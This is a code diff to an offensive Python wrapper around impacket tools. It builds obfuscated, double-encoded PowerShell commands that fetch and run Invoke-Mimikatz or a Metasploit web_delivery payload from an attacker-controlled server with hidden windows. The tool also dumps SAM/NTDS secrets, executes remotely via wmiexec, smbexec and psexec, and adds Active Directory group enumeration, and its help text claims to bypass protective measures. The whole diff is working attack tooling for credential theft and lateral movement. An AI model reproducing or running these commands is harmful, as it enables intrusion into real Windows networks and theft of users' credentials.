@@ -43,7 +43,7 @@ except Exception as e:
     sys.exit("[!] Install the necessary impacket libraries and move this script to the examples directory within it")
 
 class Obfiscator:
-    def __init__(self, src_ip, src_port, payload, function, argument, execution, methods, dst_ip="", dst_port=""):
+    def __init__(self, src_ip, src_port, payload, function, argument, execution, methods, group, dst_ip="", dst_port=""):
         self.src_ip = src_ip
         self.dst_ip = dst_ip
         self.dst_port = dst_port
@@ -53,6 +53,7 @@ class Obfiscator:
         self.argument = argument
         self.execution = execution
         self.methods = methods
+        self.group = group
         self.command = ""
         try:
             self.run()
@@ -70,6 +71,9 @@ class Obfiscator:
         elif "psexec" in self.execution:
             # Direct invoker via psexec
             self.invoker_psexec()
+        elif "group" in self.execution:
+            # Extract Group Members
+            self.group_members()
 
     def packager(self, cleartext):
         encoded_utf = cleartext.encode('utf-16-le')
@@ -86,14 +90,17 @@ class Obfiscator:
 
     def invoker(self):
         # Invoke Mimikatz Directly
-        # Creates the command iex (New-Object Net.WebClient).DownloadString('http://system_ip:src_port/payload'); function -argument
         text = "iex (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s -%s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function), str(self.argument))
         self.command = self.packager(text)
 
     def downloader(self):
         # Download String Directly
-        # Creates the command iex (New-Object Net.WebClient).DownloadString('http://system_ip:src_port/payload')
-        text = "iex (New-Object Net.WebClient).DownloadString('http://%s:%s/%s')" % (str(self.src_ip), str(self.src_port), str(self.payload))
+        text = "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://%s:%s/'))" % (str(self.src_ip), str(self.src_port))
+        self.command = self.packager(text)
+
+    def group_members(self):
+        # Group Membership
+        text = "Get-ADGroupMember -identity %s -Recursive | Get-ADUser -Property DisplayName | Select Name,ObjectClass,DisplayName" % (str(self.group))
         self.command = self.packager(text)
 
 def get_interfaces():
@@ -157,7 +164,14 @@ def hash_test(LM, NTLM, pwd):
 
 def main():
     # If script is executed at the CLI
-    usage = '''usage: %(prog)s [-s IP] [-r port] [-x payload.ps1] [-a argument] [-f function] [-c interface] -i -d  -q -v -vv -vvv'''
+    usage = '''
+Command Shell:
+    %(prog)s [-i IP] [--user Administrator] [--pwd Password1] [-t target] --smbexec -q -v -vv -vvv
+Attack Directly:
+    %(prog)s [-i IP] [--user Administrator] [--pwd Password1] [-t target] --wmiexec --invoker -q -v -vv -vvv
+Create Pasteable Double Encoded Script:
+    %(prog)s --invoker -q -v -vv -vvv
+'''
     parser = argparse.ArgumentParser(usage=usage, description="A wrapping and execution tool for a some of the most useful impacket tools", epilog="This script oombines specific attacks with dynmaic methods, which allow you to bypass many protective measures.")
     group1 = parser.add_argument_group('Method')
     group2 = parser.add_argument_group('Attack')
@@ -171,13 +185,14 @@ def main():
     iex_options.add_argument("-i", action="store", dest="src_ip", default=None, help="Set the IP address of the Mimkatz server, defaults to eth0 IP")
     iex_options.add_argument("-n", action="store", dest="interface", default="eth0", help="Instead of setting the IP you can extract it by interface, default eth0")
     iex_options.add_argument("-p", action="store", dest="src_port", default="8000", help="Set the port the Mimikatz server is on, defaults to port 8000")
-    iex_options.add_argument("-x", action="store", dest="payload", default="/root/Invoke-Mimikatz.ps1", help="The name of the Mimikatz file")
+    iex_options.add_argument("-x", action="store", dest="payload", default="Invoke-Mimikatz.ps1", help="The name of the Mimikatz file, the default is Invoke-Mimikatz.ps1")
     iex_options.add_argument("-a", action="store", dest="mim_arg", default="DumpCreds", help="Allows you to change the argument name if the Mimikatz script was changed, defaults to DumpCreds")
     iex_options.add_argument("-f", action="store", dest="mim_func", default="Invoke-Mimikatz", help="Allows you to change the function name if the Mimikatz script was changed, defaults to Invoke-Mimikatz")
     attack.add_argument("--invoker", action="store_true", dest="invoker", help="Configures the command to use Mimikatz invoker")
     attack.add_argument("--downloader", action="store_true", dest="downloader", help="Configures the command to use Metasploit's exploit/multi/script/web_delivery")
     attack.add_argument("--secrets_dump", action="store_true", dest="sam_dump", help="Execute a SAM table dump")
     attack.add_argument("--command", action="store", dest="command", default="cmd.exe", help="Set the command that will be executed, default is cmd.exe")
+    attack.add_argument("--group-members", action="store", dest="group", help="Identifies members of Domain Groups through PowerShell")
     remote_attack.add_argument("-t", action="store", dest="target", default=None, help="The system you are attempting to exploit")
     remote_attack.add_argument("--domain", action="store", dest="dom", default="WORKGROUP", help="The domain the user is apart of, defaults to WORKGROUP")
     remote_attack.add_argument("--user", action="store", dest="usr", default=None, help="The username that will be used to exploit the system")
@@ -238,6 +253,7 @@ def main():
     security = args.security
     sam = args.sam
     ntds = args.ntds
+    group = args.group
     LM = ""
     NTLM = ""
     no_output = False
@@ -298,15 +314,19 @@ def main():
 
     if invoker:
         execution = "invoker"
-        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict)
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
         command = x.return_command()
     if downloader:
         execution = "downloader"
-        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict)
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
         command = x.return_command()
     elif psexec_cmd and invoker:
         execution = "psexec"
-        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict)
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
+        command = x.return_command()
+    elif group:
+        execution = "group"
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
         command = x.return_command()
 
     if "invoker" in execution:
@@ -315,11 +335,11 @@ def main():
     elif "downloader" in execution:
         supplement = '''[*] If you have not already done this, start-up your Metasploit module exploit/multi/script/web_delivery.
 [*] Make sure to select the PowerShell and copy the payload name for this script and set the URIPATH to /.'''
-
+    elif "group" in execution:
+        supplement = '''[*] This script will identify Members of the Group: ''' + group + ''' with PowerShell.'''
     instructions = supplement + '''
 [*] Then copy and paste the following command into the target boxes command shell.
-[*] You will have cleartext credentials as long as you have correct privileges and PowerShell access.
-[*] This execution script is double encoded script.
+[*] This execution script is double encoded.
 '''
 
     if psexec_cmd:
